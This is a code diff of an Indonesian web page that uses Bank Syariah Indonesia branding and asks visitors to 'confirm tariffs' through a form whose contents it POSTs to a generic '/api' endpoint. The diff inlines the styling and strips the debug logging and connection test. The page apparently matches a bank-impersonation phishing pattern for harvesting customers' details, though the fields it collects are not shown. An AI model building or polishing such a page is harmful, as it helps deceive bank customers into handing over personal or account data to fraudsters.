@@ -2,10 +2,119 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Bank Syariah Indonesia</title>
+    <title>Konfirmasi Tarif - BSI</title>
     <meta name="theme-color" content="#00A39E">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            padding: 20px;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo h1 {
+            color: #00A39E;
+            font-size: 24px;
+        }
+        
+        .description {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #555;
+        }
+        
+        .radio-group {
+            margin-bottom: 20px;
+        }
+        
+        .radio-item {
+            display: block;
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            background: #f8f8f8;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .radio-item:hover {
+            background: #eefbfa;
+            border-color: #00A39E;
+        }
+        
+        .radio-item input {
+            margin-right: 10px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #00A39E;
+            box-shadow: 0 0 0 2px rgba(0, 163, 158, 0.2);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #00A39E;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .submit-btn:hover {
+            background-color: #00857F;
+        }
+        
+        .submit-btn:disabled {
+            background-color: #9dd6d4;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -14,7 +123,7 @@
         </div>
         
         <div class="form-container">
-            <p class="description">Yuk segara konfirmasikan tarif sesuai dengan kebutuhan anda</p>
+            <p class="description">Konfirmasi tarif sesuai kebutuhan Anda</p>
             
             <form id="bsiForm">
                 <div class="radio-group">
@@ -64,13 +173,11 @@
             const originalText = submitBtn.textContent;
             
             try {
-                // Show loading
+                // Tampilkan loading
                 submitBtn.textContent = 'Memproses...';
                 submitBtn.disabled = true;
                 
-                console.log('Sending data:', data);
-                
-                // Send to API
+                // Kirim ke API
                 const response = await fetch('/api', {
                     method: 'POST',
                     headers: {
@@ -79,10 +186,7 @@
                     body: JSON.stringify(data)
                 });
                 
-                console.log('Response status:', response.status);
-                
                 const result = await response.json();
-                console.log('Response data:', result);
                 
                 if (result.success) {
                     alert('✅ Data berhasil dikirim!');
@@ -93,23 +197,12 @@
                     alert('❌ Error: ' + result.message);
                 }
             } catch (error) {
-                console.error('Fetch error:', error);
+                console.error('Error:', error);
                 alert('❌ Terjadi kesalahan jaringan. Silakan coba lagi.');
             } finally {
-                // Reset button
+                // Reset tombol
                 submitBtn.textContent = originalText;
                 submitBtn.disabled = false;
-            }
-        });
-
-        // Test connection on load
-        window.addEventListener('load', async () => {
-            try {
-                const testResponse = await fetch('/api/hello');
-                const testResult = await testResponse.json();
-                console.log('API test:', testResult);
-            } catch (error) {
-                console.warn('API test failed:', error);
             }
         });
     </script>
